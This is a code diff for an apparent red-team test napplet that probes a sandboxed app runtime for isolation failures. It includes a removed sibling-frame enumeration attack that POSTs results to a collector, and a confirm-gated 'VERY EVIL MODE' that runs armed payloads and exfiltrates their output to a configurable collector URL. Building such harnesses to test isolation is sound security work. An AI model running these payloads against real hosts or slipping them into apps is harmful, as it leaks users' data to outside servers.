-        return { attempted: url, opened: !!w };
-      },
-    },
-    {
-      id: 'sibling-enum',
-      name: 'sibling napplet enumeration',
-      target: 'cross-origin Window accessibles — parent.length',
-      severity: 'high',
-      harm: 'parent.length and parent.frames.length are cross-origin readable — an opaque-origin napplet can count sibling napplets even in a fully spec-compliant runtime. Side channel into the shell\'s composition.',
-      evilBrief: 'Reads parent.length / parent.frames.length (sibling napplet count) and POSTs it to the collector.',
-      async demo() {
-        let n = null;
-        try { n = window.parent.length; } catch (e) { return blocked(errMsg(e)); }
-        const siblings = n - 1; // parent.length counts this frame too
-        return siblings > 0
-          ? armed('parent.length = ' + n + ' → ' + siblings + ' sibling frame(s) enumerable cross-origin')
-          : na('parent.length = ' + n + ' (this frame only) — no siblings to enumerate, but the counting channel itself is open');
-      },
-      async evil() {
-        const out = { parentLength: safeGet(() => window.parent.length), siblings: safeGet(() => window.parent.length - 1) };
-        out.exfil = await sendToCollector('sibling-enum', out);
-        return out;
-      },
-    },
-  ];
 
   /* ---------- rendering ---------- */
 
@@ -599,7 +660,7 @@
     return '<span class="chip ' + s + '">' + sev + '</span>';
   }
   function statusChip(st) {
-    const label = st === 'armed' ? 'ARMED' : st === 'blocked' ? 'HELD' : st === 'na' ? 'N/A' : st || '—';
+    const label = st === 'armed' ? 'ARMED' : st === 'blocked' ? 'HELD' : st === 'sent' ? 'SENT' : st === 'na' ? 'N/A' : st || '—';
     return '<span class="chip status-' + (st || 'na') + '">' + label + '</span>';
   }
   function esc(s) {
@@ -610,7 +671,7 @@
     for (const a of ATTACKS) {
       const r = state.results[a.id] || {};
       const div = document.createElement('div');
-      div.className = 'attack' + (r.status === 'armed' ? ' armed' : '');
+      div.className = 'attack' + (r.status === 'armed' || r.status === 'sent' ? ' ' + r.status : '');
       div.dataset.attack = a.id;
       div.dataset.status = r.status || 'pending';
       div.innerHTML =
@@ -630,14 +691,39 @@
     });
   }
   function renderSummary() {
-    const counts = { armed: 0, blocked: 0, na: 0 };
-    for (const a of ATTACKS) { const s = (state.results[a.id] || {}).status; if (counts[s] != null) counts[s]++; }
+    const counts = { armed: 0, blocked: 0, na: 0, sent: 0 };
+    for (const a of ATTACKS) {
+      const s = (state.results[a.id] || {}).status;
+      if (counts[s] != null) counts[s]++;
+    }
     summaryEl.innerHTML = state.veryEvil
       ? '<b>VERY EVIL MODE ACTIVE</b> · payloads executed'
-      : 'demo mode · <b>' + counts.armed + ' armed</b> / <span class="ok-count">' + counts.blocked + ' held</span> / ' + counts.na + ' n/a';
-    const armedCount = counts.armed;
-    armBtn.disabled = armedCount === 0;
-    armBtn.title = armedCount === 0 ? 'nothing armed — runtime held every probe' : armedCount + ' attack(s) armed';
+      : 'demo mode · <b>' + counts.armed + ' armed</b> / <span class="ok-count">' + counts.blocked + ' held</span> / <span class="sent-count">' + counts.sent + ' sent</span> / ' + counts.na + ' n/a';
+    const armable = counts.armed + counts.sent;
+    armBtn.disabled = armable === 0;
+    armBtn.title = armable === 0 ? 'nothing armed — runtime held every probe' : armable + ' attack(s) armable';
+  }
+  function renderKit() {
+    const kit = window.__EVIL_KIT__;
+    if (!kit || !kit.length) return;
+    const d = document.createElement('details');
+    d.id = 'kit';
+    d.innerHTML = '<summary>attack kit — crafted inputs (copy)</summary>';
+    for (const entry of kit) {
+      const div = document.createElement('div');
+      div.className = 'kit-entry';
+      div.innerHTML =
+        '<div class="kit-label">' + esc(entry.label) + '</div>' +
+        (entry.note ? '<div class="kit-note">' + esc(entry.note) + '</div>' : '') +
+        '<pre>' + esc(typeof entry.data === 'string' ? entry.data : JSON.stringify(entry.data, null, 2)) + '</pre>' +
+        '<div class="row-actions"><button type="button">copy</button></div>';
+      div.querySelector('button').addEventListener('click', () => {
+        const text = typeof entry.data === 'string' ? entry.data : JSON.stringify(entry.data, null, 2);
+        try { void navigator.clipboard.writeText(text); } catch (_) { /* clipboard denied */ }
+      });
+      d.appendChild(div);
+    }
+    document.getElementById('reportBox').before(d);
   }
   function render() { renderRows(); renderSummary(); }
 
@@ -661,15 +747,18 @@
   /* ---------- VERY EVIL ---------- */
 
   function planOrder() {
-    // destructive payloads last: navigation destroys this frame.
-    return ['nip07', 'shared-storage', 'parent-dom', 'referrer', 'sibling-enum', 'service-worker', 'popup', 'parent-nav'];
+    const plain = ATTACKS.filter((a) => a.evil && !a.destructive);
+    const last = ATTACKS.filter((a) => a.evil && a.destructive);
+    return plain.concat(last);
   }
   function openConfirm() {
-    const armedOnes = planOrder().map((id) => ATTACKS.find((a) => a.id === id))
-      .filter((a) => a && a.evil && (state.results[a.id] || {}).status === 'armed');
-    if (!armedOnes.length) return;
+    const armable = planOrder().filter((a) => {
+      const s = (state.results[a.id] || {}).status;
+      return s === 'armed' || s === 'sent';
+    });
+    if (!armable.length) return;
     planList.innerHTML = '';
-    for (const a of armedOnes) {
+    for (const a of armable) {
       const li = document.createElement('li');
       li.innerHTML = '<b>' + esc(a.name) + '</b> — ' + esc(a.evilBrief || a.harm);
       planList.appendChild(li);
@@ -681,7 +770,6 @@
   }
   collectorInput.addEventListener('input', () => { state.collector = collectorInput.value.trim() || DEFAULT_COLLECTOR; });
   confirmInput.addEventListener('input', () => { confirmBtn.disabled = confirmInput.value !== CONFIRM_PHRASE; });
-  confirmDlg.addEventListener('close', () => { if (!state.veryEvil) { /* canceled */ } });
 
   confirmBtn.addEventListener('click', async () => {
     confirmDlg.close();
@@ -699,22 +787,20 @@
     logLine('VERY EVIL MODE — executing armed payloads against ' + safeGet(() => location.href));
     logLine('collector: ' + state.collector);
     renderSummary();
-    for (const id of planOrder()) {
-      const a = ATTACKS.find((x) => x.id === id);
-      if (!a || !a.evil) continue;
-      const st = (state.results[id] || {}).status;
-      if (st !== 'armed') {
-        state.evilResults[id] = { skipped: 'not armed (' + (st || 'unprobed') + ') — runtime held' };
-        logLine('SKIP ' + a.name + ' — not armed, the runtime holds');
+    for (const a of planOrder()) {
+      const st = (state.results[a.id] || {}).status;
+      if (st !== 'armed' && st !== 'sent') {
+        state.evilResults[a.id] = { skipped: 'not armed (' + (st || 'unprobed') + ') — runtime holds' };
+        logLine('SKIP ' + a.name + ' — not armable, the runtime holds');
         updateReport();
         continue;
       }
-      logLine('RUN  ' + a.name + ' — ' + a.evilBrief);
+      logLine('RUN  ' + a.name + ' — ' + (a.evilBrief || a.harm));
       try {
-        state.evilResults[id] = await a.evil();
-        logLine('DONE ' + a.name + ' → ' + JSON.stringify(state.evilResults[id]).slice(0, 400));
+        state.evilResults[a.id] = await a.evil();
+        logLine('DONE ' + a.name + ' → ' + JSON.stringify(state.evilResults[a.id]).slice(0, 400));
       } catch (e) {
-        state.evilResults[id] = { error: errMsg(e) };
+        state.evilResults[a.id] = { error: errMsg(e) };
         logLine('ERR  ' + a.name + ' → ' + errMsg(e));
       }
       updateReport();
@@ -728,7 +814,7 @@
 
   function buildReport() {
     return {
-      napplet: 'evil-01-sandbox-escape',
+      napplet: window.__EVIL_ID__ || 'unknown',
       mode: state.veryEvil ? 'VERY-EVIL' : 'demo',
       at: new Date().toISOString(),
       collector: state.collector,
@@ -754,13 +840,11 @@
     d.open = !d.open;
   });
 
-  armBtn.addEventListener('click', () => {
-    updateReport();
-    openConfirm();
-  });
+  armBtn.addEventListener('click', () => { updateReport(); openConfirm(); });
   document.getElementById('runAllBtn').addEventListener('click', () => { void runAllDemos(); });
 
   /* ---------- boot ---------- */
+  renderKit();
   render();
   updateReport();
   void runAllDemos();
